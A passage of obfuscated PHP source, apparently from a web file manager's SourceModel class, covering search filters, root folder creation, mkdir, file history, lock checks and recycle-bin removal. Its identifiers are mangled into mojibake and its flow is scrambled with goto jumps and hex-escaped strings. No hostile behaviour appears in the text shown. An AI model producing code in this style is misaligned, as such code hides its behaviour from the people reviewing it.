$C¬¼–¸¸æ = array($bÜçŠŞÃÌÑ[463] => array($bÜçŠŞÃÌÑ[7], $eöÄâ‚ãˆ—)); $BÀ·”»È÷™ = $this->field($bÜçŠŞÃÌÑ[2348])->where($C¬¼–¸¸æ)->select(); goto B…¿‰ŠëÊ­; dœİ÷êÆ•©: $bÜçŠŞÃÌÑ =& $_SERVER[Å¸ş]; $fŸÒéË£¾‚ = array(); $C¬¼–¸¸æ = array($bÜçŠŞÃÌÑ[463] => $CùìÏÑï»); goto Bƒ¦ øß·¡; Bƒ¦ øß·¡: $BÀ·”»È÷™ = $this->field($bÜçŠŞÃÌÑ[2348])->where($C¬¼–¸¸æ)->select(); $eöÄâ‚ãˆ— = array_to_keyvalue(array_filter_by_field($BÀ·”»È÷™, $bÜçŠŞÃÌÑ[370], $bÜçŠŞÃÌÑ[83]), $bÜçŠŞÃÌÑ[33], $bÜçŠŞÃÌÑ[369]); $fŸÒéË£¾‚ = array_merge($fŸÒéË£¾‚, array_to_keyvalue($BÀ·”»È÷™, $bÜçŠŞÃÌÑ[33], $bÜçŠŞÃÌÑ[369])); goto CğÕšÅËÚ; B…¿‰ŠëÊ­: $fŸÒéË£¾‚ = array_merge($fŸÒéË£¾‚, array_to_keyvalue($BÀ·”»È÷™, $bÜçŠŞÃÌÑ[33], $bÜçŠŞÃÌÑ[369])); $fŸÒéË£¾‚ = array_slice($fŸÒéË£¾‚, 0, $cÓ¢è‡öêò); return $fŸÒéË£¾‚; goto a¼×ïçèæ; a¼×ïçèæ: } private function _listSearchBindPinyin($Bô×óÉò, &$cĞ¿õÓë‘å, &$DÂã‚Ë³Ú›) { goto D«åš”¯ÇÌ; D¿Ê¸ˆ©Õ: $EóÙ…Ã­˜÷[] = array($f£˜½¥Öù¬[2352] => $fª¥”ŠßªÁ, $f£˜½¥Öù¬[911] => $f£˜½¥Öù¬[2193], array($f£˜½¥Öù¬[2353] => $fª¥”ŠßªÁ, $f£˜½¥Öù¬[2354] => array($f£˜½¥Öù¬[7], array($f£˜½¥Öù¬[416], $f£˜½¥Öù¬[415])))); $this->join($Eï†ÆÜÜ); $cĞ¿õÓë‘å = $EóÙ…Ã­˜÷; goto CøŠßµ‚óÒ; b‹–šëŞ¦: $EóÙ…Ã­˜÷ = array(); $DÂã‚Ë³Ú› = str_replace(array($f£˜½¥Öù¬[217], $f£˜½¥Öù¬[50], $f£˜½¥Öù¬[2349]), $f£˜½¥Öù¬[33], $DÂã‚Ë³Ú›); $DÂã‚Ë³Ú› = $f£˜½¥Öù¬[2350] . str_replace($f£˜½¥Öù¬[47], $f£˜½¥Öù¬[2351], $DÂã‚Ë³Ú›); goto e»Î‰ÀŠ®Ø; D«åš”¯ÇÌ: $f£˜½¥Öù¬ =& $_SERVER[Å¸ş]; if (!Input::check($Bô×óÉò[$f£˜½¥Öù¬[2189]], $f£˜½¥Öù¬[306]) || strlen($Bô×óÉò[$f£˜½¥Öù¬[2189]]) < 2) { return; } $Eï†ÆÜÜ = "\x4c\x45\x46\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\151\x6f\137\163\x6f\165\x72\x63\145\x5f\155\x65\x74\x61\x20\x6d\145\x74\x61\40\x6f\x6e\40\163\x6f\165\162\x63\145\56\x73\157\x75\x72\x63\145\x49\104\x20\x3d\x20\155\145\164\x61\x2e\163\157\165\x72\143\x65\x49\x44"; goto b‹–šëŞ¦; e»Î‰ÀŠ®Ø: unset($cĞ¿õÓë‘å[$f£˜½¥Öù¬[28]]); foreach ($cĞ¿õÓë‘å as $DÏ‘—”‚ë => $D£ª °óñ) { $EóÙ…Ã­˜÷[$f£˜½¥Öù¬[2350] . $DÏ‘—”‚ë] = $D£ª °óñ; } $fª¥”ŠßªÁ = array($f£˜½¥Öù¬[485], $f£˜½¥Öù¬[2191] . $Bô×óÉò[$f£˜½¥Öù¬[2189]] . $f£˜½¥Öù¬[2191]); goto D¿Ê¸ˆ©Õ; CøŠßµ‚óÒ: } private function _parseSearchWhere($C˜Š¤œ¬ğ) { goto dÎõ¤ê“; f²²¨ÈÚ¸ğ: if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2189]]) && $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2189]]) { $E‘¾®Ÿª¥À = $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2189]]; $eÁ·”Òö = explode($aÎ¦Ç¶‰«[50], $E‘¾®Ÿª¥À); if (strlen($E‘¾®Ÿª¥À) > 2 && (substr($E‘¾®Ÿª¥À, 0, 1) == $aÎ¦Ç¶‰«[113] && substr($E‘¾®Ÿª¥À, -1) == $aÎ¦Ç¶‰«[113]) || substr($E‘¾®Ÿª¥À, 0, 1) == $aÎ¦Ç¶‰«[55] && substr($E‘¾®Ÿª¥À, -1) == $aÎ¦Ç¶‰«[55]) { $E‘¾®Ÿª¥À = substr($E‘¾®Ÿª¥À, 1, -1); $eÁ·”Òö = array($E‘¾®Ÿª¥À); } $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[28]] = array($aÎ¦Ç¶‰«[485], $aÎ¦Ç¶‰«[2191] . $E‘¾®Ÿª¥À . $aÎ¦Ç¶‰«[2191]); if (count($eÁ·”Òö) > 1) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[28]] = array(); foreach ($eÁ·”Òö as $EŞ“É½¼½Ë) { if (!trim($EŞ“É½¼½Ë)) { continue; } $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[28]][] = array($aÎ¦Ç¶‰«[485], $aÎ¦Ç¶‰«[2191] . trim($EŞ“É½¼½Ë) . $aÎ¦Ç¶‰«[2191]); } } } return $E”ÄÜÔÒÕÈ; goto aÔÇó¯³É; dÎõ¤ê“: $aÎ¦Ç¶‰« =& $_SERVER[Å¸ş]; $E”ÄÜÔÒÕÈ = array(); if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[705]])) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[107]] = array($aÎ¦Ç¶‰«[2355], $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[705]]); } goto BÜèÜ†ŠÁ»; BÜèÜ†ŠÁ»: if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[449]])) { $E±¥Ó®¬ÎŞ = array($aÎ¦Ç¶‰«[2356], $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[449]]); if ($E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[107]]) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[107]] = array($E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[107]], $E±¥Ó®¬ÎŞ, $aÎ¦Ç¶‰«[2357]); } else { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[107]] = $E±¥Ó®¬ÎŞ; } } if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2358]])) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[77]] = array($aÎ¦Ç¶‰«[2355], $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2358]]); } if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2359]])) { $E±¥Ó®¬ÎŞ = array($aÎ¦Ç¶‰«[2356], $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[2359]]); if ($E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[77]]) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[77]] = array($E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[77]], $E±¥Ó®¬ÎŞ, $aÎ¦Ç¶‰«[2357]); } else { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[77]] = $E±¥Ó®¬ÎŞ; } } goto eÔ‡õÅšËË; eÔ‡õÅšËË: if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[537]])) { $E”ÄÜÔÒÕÈ[] = array($aÎ¦Ç¶‰«[379] => $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[537]], $aÎ¦Ç¶‰«[378] => $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[537]], $aÎ¦Ç¶‰«[911] => $aÎ¦Ç¶‰«[2193]); } if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[372]])) { $bÅ¯Ò±ØË‡ = $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[372]]; if ($bÅ¯Ò±ØË‡ == $aÎ¦Ç¶‰«[76]) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[370]] = 1; } else { if ($bÅ¯Ò±ØË‡ == $aÎ¦Ç¶‰«[2360]) { $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[370]] = 0; } else { if ($bÅ¯Ò±ØË‡) { $bÅ¯Ò±ØË‡ = is_array($bÅ¯Ò±ØË‡) ? $bÅ¯Ò±ØË‡ : explode($aÎ¦Ç¶‰«[47], $bÅ¯Ò±ØË‡); $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[372]] = array($aÎ¦Ç¶‰«[384], $bÅ¯Ò±ØË‡); $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[370]] = 0; } } } } if (isset($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[463]])) { $C´ó‡…®„™ = $this->sourceInfo($C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[463]]); $E”ÄÜÔÒÕÈ[$aÎ¦Ç¶‰«[527]] = array($aÎ¦Ç¶‰«[485], $C´ó‡…®„™[$aÎ¦Ç¶‰«[461]] . $C˜Š¤œ¬ğ[$aÎ¦Ç¶‰«[463]] . $aÎ¦Ç¶‰«[486]); } goto f²²¨ÈÚ¸ğ; aÔÇó¯³É: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($A«™Ş£Ü) { $fÓæÏöšèÁ =& $_SERVER[Å¸ş]; $Fî«ËîŒŸÅ = Model($fÓæÏöšèÁ[476])->where(array($fÓæÏöšèÁ[1427] => $A«™Ş£Ü))->find(); $E…â„†øùœ = $this->_mkdirRoot(SourceModel::TYPE_USER, $A«™Ş£Ü, $Fî«ËîŒŸÅ[$fÓæÏöšèÁ[28]]); $this->userDesktopAdd($E…â„†øùœ); return $E…â„†øùœ; } public function userDesktopAdd($eó’¥Ì×à¥) { $A÷ÆÓ´´İ¾ =& $_SERVER[Å¸ş]; $BŒ‘Û›¢¯¬ = LNG($A÷ÆÓ´´İ¾[2361]); $a«è²Ü½• = $this->mkdir($eó’¥Ì×à¥, $BŒ‘Û›¢¯¬); $this->metaSet($a«è²Ü½•, $A÷ÆÓ´´İ¾[2362], $A÷ÆÓ´´İ¾[83]); $this->metaSet($eó’¥Ì×à¥, $A÷ÆÓ´´İ¾[2363], $a«è²Ü½•); } public function groupRootAdd($aé¾õÁÓò) { $bŠÛŞÏ¹µ» =& $_SERVER[Å¸ş]; $CÇœ¹õ° = Model($bŠÛŞÏ¹µ»[460])->where(array($bŠÛŞÏ¹µ»[2185] => $aé¾õÁÓò))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aé¾õÁÓò, $CÇœ¹õ°[$bŠÛŞÏ¹µ»[28]]); } public function systemRootPathAdd($B”‚öº‰Å) { if ($B”‚öº‰Å != $_SERVER[Å¸ş][1087]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B”‚öº‰Å); } public function userRootRemove($CïÊÄ§ÙÔ„) { $e„‹ì‘Óç´ = $this->sourceRoot(SourceModel::TYPE_USER, $CïÊÄ§ÙÔ„); if (!$e„‹ì‘Óç´) { return; } $this->remove($e„‹ì‘Óç´, !1); } public function groupRootRemove($eªÌò„Ù˜) { $b•Ø¾Õƒª‘ = $this->sourceRoot(SourceModel::TYPE_GROUP, $eªÌò„Ù˜); if (!$b•Ø¾Õƒª‘) { return; } $this->remove($b•Ø¾Õƒª‘, !1); } private function _mkdirRoot($cÁìå¢¨‚¦, $C¨ÅÔôŞÄĞ, $döòÅÇ˜ĞÌ) { goto eíÀÑ¶­Ÿî; EŒµñ—šóô: $aÀ¡Ù¹êä„ = $this->add($FõËá„©à¹); $cÄœ¨ØöŒ = array($BñÉˆˆİÈ[529] => short_id($aÀ¡Ù¹êä„)); $this->where(array($BñÉˆˆİÈ[383] => $aÀ¡Ù¹êä„))->save($cÄœ¨ØöŒ); goto AçÖ»¦éà¹; eíÀÑ¶­Ÿî: $BñÉˆˆİÈ =& $_SERVER[Å¸ş]; $FõËá„©à¹ = array($BñÉˆˆİÈ[368] => 0, $BñÉˆˆİÈ[523] => $cÁìå¢¨‚¦, $BñÉˆˆİÈ[524] => $C¨ÅÔôŞÄĞ, $BñÉˆˆİÈ[520] => 1, $BñÉˆˆİÈ[525] => USER_ID, $BñÉˆˆİÈ[526] => USER_ID, $BñÉˆˆİÈ[521] => $BñÉˆˆİÈ[33], $BñÉˆˆİÈ[527] => $BñÉˆˆİÈ[472], $BñÉˆˆİÈ[396] => 0, $BñÉˆˆİÈ[522] => 0, $BñÉˆˆİÈ[420] => 0, $BñÉˆˆİÈ[528] => $BñÉˆˆİÈ[33]); if ($cùÂ¸ÅŠš½ = $this->where($FõËá„©à¹)->find()) { return $cùÂ¸ÅŠš½[$BñÉˆˆİÈ[369]]; } goto f¤”Ÿ’Œ¼â; AçÖ»¦éà¹: CacheLock::unlock($eÔøÄÆ…³Ì); return $aÀ¡Ù¹êä„; goto FÁ†ÅìëòÓ; f¤”Ÿ’Œ¼â: $eÔøÄÆ…³Ì = "\x4d\x6f\x64\145\x6c\123\157\165\x72\143\x65\56\x6d\153\144\151\162\122\157\x6f\164\56{$cÁìå¢¨‚¦}\x2e{$C¨ÅÔôŞÄĞ}\x2e" . $döòÅÇ˜ĞÌ; CacheLock::lock($eÔøÄÆ…³Ì); $FõËá„©à¹[$BñÉˆˆİÈ[28]] = $döòÅÇ˜ĞÌ; goto EŒµñ—šóô; FÁ†ÅìëòÓ: } private function sourceRoot($a¬’“¹™, $fÅ„Èİ¼ØĞ, $b®øùëÅÛ = false) { $bÛã†‚·Ìè =& $_SERVER[Å¸ş]; $aµŠÜßéô = array($bÛã†‚·Ìè[368] => 0, $bÛã†‚·Ìè[523] => $a¬’“¹™, $bÛã†‚·Ìè[524] => $fÅ„Èİ¼ØĞ); if ($FÉÓ¹è‹‚ = $this->where($aµŠÜßéô)->find()) { return $b®øùëÅÛ ? $FÉÓ¹è‹‚ : $FÉÓ¹è‹‚[$bÛã†‚·Ìè[369]]; } return !1; } public function sourceRootGroup($dä£ ‰æ”) { $D…‚ÄÖ Çí =& $_SERVER[Å¸ş]; if (is_string($dä£ ‰æ”)) { $dä£ ‰æ” = array($dä£ ‰æ”); } $F°î„‡®àó = array($D…‚ÄÖ Çí[368] => 0, $D…‚ÄÖ Çí[523] => SourceModel::TYPE_GROUP, $D…‚ÄÖ Çí[524] => array($D…‚ÄÖ Çí[7], $dä£ ‰æ”)); $fİÜĞˆ…ó = $this->listSource($F°î„‡®àó, 1000); return array_to_keyvalue($fİÜĞˆ…ó[$D…‚ÄÖ Çí[74]], $D…‚ÄÖ Çí[458]); } public function mkfile($D˜Š“‹±ÂÚ, $fÃâà¡•ª, $AÊ¦ÓÏ­•ó = '', $B¶ï–’¯ = REPEAT_RENAME) { $D³ÅÒá¿Ğ =& $_SERVER[Å¸ş]; $e¥î—–õ‚Å = Model($D³ÅÒá¿Ğ[546])->addFileByContent($AÊ¦ÓÏ­•ó, $fÃâà¡•ª); return $this->_createFileCall($D˜Š“‹±ÂÚ, $fÃâà¡•ª, $e¥î—–õ‚Å, $B¶ï–’¯, $D³ÅÒá¿Ğ[1124]); } public function addFile($c¼óäÊ‘¦ø, $E»Ëá†º, $B¨±šó«¸, $b£Ûà¢í§¡ = false, $C¡˜ÉŒ‘õŒ = REPEAT_RENAME) { $a–¿‘Ô¼íË = Model($_SERVER[Å¸ş][546])->addFile($E»Ëá†º, $B¨±šó«¸, $b£Ûà¢í§¡); return $this->_createFileCall($c¼óäÊ‘¦ø, $B¨±šó«¸, $a–¿‘Ô¼íË, $C¡˜ÉŒ‘õŒ); } public function addFileByFileID($D™Ë„£Ñ†ì, $E¯â˜½¾ƒà, $e°ßë­µÅ‹, $cŒñÍÊƒÒ = REPEAT_RENAME) { $bÒÉ£°á =& $_SERVER[Å¸ş]; $bÃæ„ğÊˆ = Model($bÒÉ£°á[546])->find($E¯â˜½¾ƒà); Model($bÒÉ£°á[546])->linkAdd($E¯â˜½¾ƒà); return $this->_createFileCall($D™Ë„£Ñ†ì, $e°ßë­µÅ‹, $bÃæ„ğÊˆ, $cŒñÍÊƒÒ); } public function addFileByRemote($f¿¸ãñî°, $b™´ô£Œ«…, $e·£ÜÛìã¿, $A´À•º‹…Ì = array(), $C‘•Å™Ñ­ = REPEAT_RENAME) { $a¡ãèæ Ş = Model($_SERVER[Å¸ş][546])->addFileByRemote($b™´ô£Œ«…, $e·£ÜÛìã¿, $A´À•º‹…Ì); return $this->_createFileCall($f¿¸ãñî°, $e·£ÜÛìã¿, $a¡ãèæ Ş, $C‘•Å™Ñ­); } private function _createFileCall($aŠ¥òš©ÕÁ, $E½«§¬ï‡§, $fĞ‚â”›À, $fà¤’öß…Ô, $fÃğà“ø‹ = "\165\x70\x6c\x6f\141\x64") { goto d…÷øªĞäİ; eùË–Ñæñã: $E—°óøÒ­ = $this->_createFile($aŠ¥òš©ÕÁ, $E½«§¬ï‡§, $fĞ‚â”›À, $fà¤’öß…Ô, $D°Â¤‘±ø); if (!$D°Â¤‘±ø) { Model($eŸÁ †É–¶[422])->remove($fĞ‚â”›À[$eŸÁ †É–¶[419]]); } else { if ($E—°óøÒ­) { Model($eŸÁ †É–¶[2333])->eventCreate($E—°óøÒ­, $fÃğà“ø‹); } } $this->lockWriteEnd($aŠ¥òš©ÕÁ, $E½«§¬ï‡§); goto fà‘é‹ãù¨; fà‘é‹ãù¨: return $E—°óøÒ­; goto FæĞ ”Ğ¸ˆ; d…÷øªĞäİ: $eŸÁ †É–¶ =& $_SERVER[Å¸ş]; $D°Â¤‘±ø = !1; $this->lockWriteStart($aŠ¥òš©ÕÁ, $E½«§¬ï‡§); goto eùË–Ñæñã; FæĞ ”Ğ¸ˆ: } public function mkdir($BÅ„á³í×›, $aÛ”³Ñ¥¾, $D«È¥øÓ‚´ = REPEAT_SKIP) { goto BÕÇ†œùÉ; C‘„¬¢³Áö: $this->lockWriteStart($BÅ„á³í×›, $aÛ”³Ñ¥¾); if ($D«È¥øÓ‚´ !== !1) { $C•‚•§Öš³ = $this->fileNameExist($BÅ„á³í×›, $aÛ”³Ñ¥¾); if ($C•‚•§Öš³ && $D«È¥øÓ‚´ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($BÅ„á³í×›, $aÛ”³Ñ¥¾); return $C•‚•§Öš³; } $aÛ”³Ñ¥¾ = $this->fileNameAuto($BÅ„á³í×›, $aÛ”³Ñ¥¾, $D«È¥øÓ‚´); } $Ešõ‘¸² = array($FÈœÒİÁ”ß[520] => 1, $FÈœÒİÁ”ß[386] => $aÛ”³Ñ¥¾, $FÈœÒİÁ”ß[521] => $FÈœÒİÁ”ß[33], $FÈœÒİÁ”ß[420] => 0, $FÈœÒİÁ”ß[522] => 0); goto AŠßº¹ğ¤æ; BÕÇ†œùÉ: $FÈœÒİÁ”ß =& $_SERVER[Å¸ş]; $cÙ”ëåİØ³ = $this->sourceInfo($BÅ„á³í×›); if (!$cÙ”ëåİØ³) { return !1; } goto C‘„¬¢³Áö; B—‡º±õ¶Ô: return $dÀÆÚô–Û; goto aŠãËÓµøÔ; AŠßº¹ğ¤æ: $dÀÆÚô–Û = $this->_addSoure($Ešõ‘¸², $cÙ”ëåİØ³); Model($FÈœÒİÁ”ß[2333])->eventCreate($dÀÆÚô–Û, $FÈœÒİÁ”ß[1125]); $this->lockWriteEnd($BÅ„á³í×›, $aÛ”³Ñ¥¾); goto B—‡º±õ¶Ô; aŠãËÓµøÔ: } private function _createFile($báÂÏ¶í, $fÄ£……š¿, $Eˆìåçßí°, $A¸ÉêöÄğ¾, &$Fù™Å»à¢) { goto Dî†’î¸§; b£µâ’áÙ¨: return $a«§Š¦Áçè; goto a¡©À«¯•º; FĞ’ËÈº¡: if ($A¸ÉêöÄğ¾ !== !1) { $fÂå÷Ñ³ÁÍ = $this->fileNameExist($báÂÏ¶í, $fÄ£……š¿); } $Fù™Å»à¢ = !0; if ($A¸ÉêöÄğ¾ && $fÂå÷Ñ³ÁÍ) { if ($A¸ÉêöÄğ¾ == REPEAT_SKIP) { $Fù™Å»à¢ = !1; return $fÂå÷Ñ³ÁÍ; } else { if ($A¸ÉêöÄğ¾ == REPEAT_REPLACE) { $aÉ›‡†¯ = $this->sourceInfo($fÂå÷Ñ³ÁÍ); $d†ì™²’Ù = $this->fileHistory($aÉ›‡†¯, $Eˆìåçßí°[$BÃš¯ïèÉ®[419]], $Eˆìåçßí°[$BÃš¯ïèÉ®[77]]); if (!$d†ì™²’Ù) { $Fù™Å»à¢ = !1; } else { $this->folderSizeReset($báÂÏ¶í); } return $fÂå÷Ñ³ÁÍ; } else { $fÄ£……š¿ = $this->fileNameAuto($báÂÏ¶í, $fÄ£……š¿, $A¸ÉêöÄğ¾, !1); } } } goto DåğÕ¦Š¸ï; Dî†’î¸§: $BÃš¯ïèÉ® =& $_SERVER[Å¸ş]; $Aö£ÕóŠ‘ = $this->sourceInfo($báÂÏ¶í); if (!$Eˆìåçßí° || !$Aö£ÕóŠ‘) { return !1; } goto FĞ’ËÈº¡; DåğÕ¦Š¸ï: $Añ”Éİ‚ëÅ = array($BÃš¯ïèÉ®[520] => 0, $BÃš¯ïèÉ®[386] => $fÄ£……š¿, $BÃš¯ïèÉ®[521] => get_path_ext($fÄ£……š¿), $BÃš¯ïèÉ®[420] => $Eˆìåçßí°[$BÃš¯ïèÉ®[419]], $BÃš¯ïèÉ®[522] => $Eˆìåçßí°[$BÃš¯ïèÉ®[77]]); $a«§Š¦Áçè = $this->_addSoure($Añ”Éİ‚ëÅ, $Aö£ÕóŠ‘); $this->folderSizeReset($báÂÏ¶í); goto b£µâ’áÙ¨; a¡©À«¯•º: } protected function fileHistory($a ×–áÁë¢, $bÎÛ½÷–ºÉ, $a“ÆÑ±ôŞ‹) { goto aë‰Äìí¢; aë‰Äìí¢: $béƒ¶ÏŒœÃ =& $_SERVER[Å¸ş]; if ($a ×–áÁë¢[$béƒ¶ÏŒœÃ[419]] == $bÎÛ½÷–ºÉ) { return !1; } $this->checkLock($a ×–áÁë¢[$béƒ¶ÏŒœÃ[369]], $bÎÛ½÷–ºÉ); goto Aˆ˜Û–çµ; Aˆ˜Û–çµ: Model($béƒ¶ÏŒœÃ[2364])->addHistory($a ×–áÁë¢); $c‰ÎÀ‹Ç‘‰ = array($béƒ¶ÏŒœÃ[526] => USER_ID, $béƒ¶ÏŒœÃ[390] => time(), $béƒ¶ÏŒœÃ[419] => $bÎÛ½÷–ºÉ, $béƒ¶ÏŒœÃ[77] => $a“ÆÑ±ôŞ‹); $this->where(array($béƒ¶ÏŒœÃ[383] => $a ×–áÁë¢[$béƒ¶ÏŒœÃ[369]]))->save($c‰ÎÀ‹Ç‘‰); goto AØ èÈ†²; AØ èÈ†²: return !0; goto fõğ«‚ï„¯; fõğ«‚ï„¯: } public function checkLock($a¨ìëì¿‹ã, $aî¾ãËÓØ) { goto eˆòß‰»‘ù; eˆòß‰»‘ù: $FˆîÄø®ìª =& $_SERVER[Å¸ş]; $C¦˜áì™ = $this->pathInfo($a¨ìëì¿‹ã); if (!$this->fileIsLock($C¦˜áì™, !0)) { return; } goto F©¡²¬ÖàÃ; A‡Ê›Î—ÀÔ: $this->_createFileCall($C¦˜áì™[$FˆîÄø®ìª[463]], $B‰²¹‡®î, $C·š¤Êšìê, REPEAT_REPLACE, $FˆîÄø®ìª[1124]); $cÛä‘Ôô¬ = $C¦˜áì™[$FˆîÄø®ìª[417]][$FˆîÄø®ìª[483]]; $eîÌ¶ÜË‚† = $cÛä‘Ôô¬[$FˆîÄø®ìª[2366]] ? $cÛä‘Ôô¬[$FˆîÄø®ìª[2366]] : $cÛä‘Ôô¬[$FˆîÄø®ìª[28]]; goto f¼¯¡ˆĞ„; f¼¯¡ˆĞ„: show_json(LNG($FˆîÄø®ìª[2367]) . $FˆîÄø®ìª[2368] . LNG($FˆîÄø®ìª[2369]) . $FˆîÄø®ìª[2370] . $eîÌ¶ÜË‚† . $FˆîÄø®ìª[2371], !1); goto b§ßºÒ¤; F©¡²¬ÖàÃ: $FóŠÃ‹œÑË = Session::get($FˆîÄø®ìª[2365]); $B‰²¹‡®î = substr($C¦˜áì™[$FˆîÄø®ìª[28]], 0, -1 - strlen($C¦˜áì™[$FˆîÄø®ìª[160]])) . $FˆîÄø®ìª[1389] . $FóŠÃ‹œÑË . $FˆîÄø®ìª[91] . $C¦˜áì™[$FˆîÄø®ìª[160]]; $C·š¤Êšìê = Model($FˆîÄø®ìª[546])->find($aî¾ãËÓØ); goto A‡Ê›Î—ÀÔ; b§ßºÒ¤: } public function fileIsLock($FŞÁñ·‚ñÜ, $f£òä«Ñø§ = false) { goto f‡í‹ÙÔ; f‡í‹ÙÔ: $BµÜ©Üò‚‡ =& $_SERVER[Å¸ş]; if (!isset($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[417]]) || !$FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[417]][$BµÜ©Üò‚‡[480]]) { return !1; } if ($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[417]][$BµÜ©Üò‚‡[480]] != USER_ID) { return !0; } goto bæœšª†»; bæœšª†»: $eƒ¦Ãµáí¸ = $GLOBALS[$BµÜ©Üò‚‡[6]][$BµÜ©Üò‚‡[84]][$BµÜ©Üò‚‡[481]]; if ($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[417]][$BµÜ©Üò‚‡[482]] <= time() - $eƒ¦Ãµáí¸) { $this->metaSet($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[369]], $BµÜ©Üò‚‡[480], null); $this->metaSet($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[369]], $BµÜ©Üò‚‡[482], null); } if ($f£òä«Ñø§) { $this->metaSet($FŞÁñ·‚ñÜ[$BµÜ©Üò‚‡[369]], $BµÜ©Üò‚‡[482], time()); } goto aŞ†Ä¿›’¯; aŞ†Ä¿›’¯: return !1; goto F óæšäìÍ; F óæšäìÍ: } private function _addSoure($Dñ›¾˜¬œ“, $Cø©äŒÍÊ¡) { goto Bí«ªàîŸß; aˆ…”×¦îª: $c•…¢Ìâ˜´ = array($BÚƒÓÉ¬™÷[529] => short_id($AÙĞé‚ŠÍ‚)); $this->where(array($BÚƒÓÉ¬™÷[383] => $AÙĞé‚ŠÍ‚))->save($c•…¢Ìâ˜´); $this->setNamePinyin($AÙĞé‚ŠÍ‚, $Dñ›¾˜¬œ“[$BÚƒÓÉ¬™÷[28]]); goto dÄÇ§Ïœæµ; BµÒ™™ÎÂ: $this->updateModifyTime($Dñ›¾˜¬œ“[$BÚƒÓÉ¬™÷[463]]); $Aø™ğ‰·Á… = $BÚƒÓÉ¬™÷[2372] . $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[369]]; if (isset(self::$cacheChildList[$Aø™ğ‰·Á…])) { unset(self::$cacheChildList[$Aø™ğ‰·Á…]); } goto aªß•°Ö¢; dÄÇ§Ïœæµ: return $AÙĞé‚ŠÍ‚; goto b¯¹ó¢¼à; aªß•°Ö¢: static $bœå–µƒ²î = false; if (!$bœå–µƒ²î) { Hook::trigger($BÚƒÓÉ¬™÷[510], $Dñ›¾˜¬œ“); $bœå–µƒ²î = !0; } $AÙĞé‚ŠÍ‚ = $this->add($Dñ›¾˜¬œ“); goto aˆ…”×¦îª; Bí«ªàîŸß: $BÚƒÓÉ¬™÷ =& $_SERVER[Å¸ş]; $Fø†ÉºâÌ£ = array($BÚƒÓÉ¬™÷[523] => $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[371]], $BÚƒÓÉ¬™÷[524] => $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[458]], $BÚƒÓÉ¬™÷[525] => USER_ID, $BÚƒÓÉ¬™÷[526] => USER_ID, $BÚƒÓÉ¬™÷[368] => $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[369]], $BÚƒÓÉ¬™÷[527] => $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[461]] . $Cø©äŒÍÊ¡[$BÚƒÓÉ¬™÷[369]] . $BÚƒÓÉ¬™÷[47], $BÚƒÓÉ¬™÷[396] => 0, $BÚƒÓÉ¬™÷[528] => $BÚƒÓÉ¬™÷[33]); $Dñ›¾˜¬œ“ = array_merge($Fø†ÉºâÌ£, $Dñ›¾˜¬œ“); goto BµÒ™™ÎÂ; b¯¹ó¢¼à: } public function remove($DŒ—Ö’Ï©É, $B„‰§¤®ò = true) { goto dÔ¶êòÄÙÍ; fÍïì—Æ’: $A¯ñ¹¶¦ã = Model($C˜»öì›öÖ[1434])->get($C˜»öì›öÖ[2373]) == $C˜»öì›öÖ[83]; if ($F‡ë†÷‰ŞŠ || $B„‰§¤®ò || !$A¯ñ¹¶¦ã) { return $this->removeNow($DŒ—Ö’Ï©É, $B„‰§¤®ò); } $Fñ—¸½™ß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto cõô´ã¦ÂÓ; cå„¬ÍŸŞ: CacheLock::lock($bí‹¹·ñŠå); $A®í®µ×  = $this->fileNameExist($Fñ—¸½™ß, $C ƒõßâæç); if (!$A®í®µ× 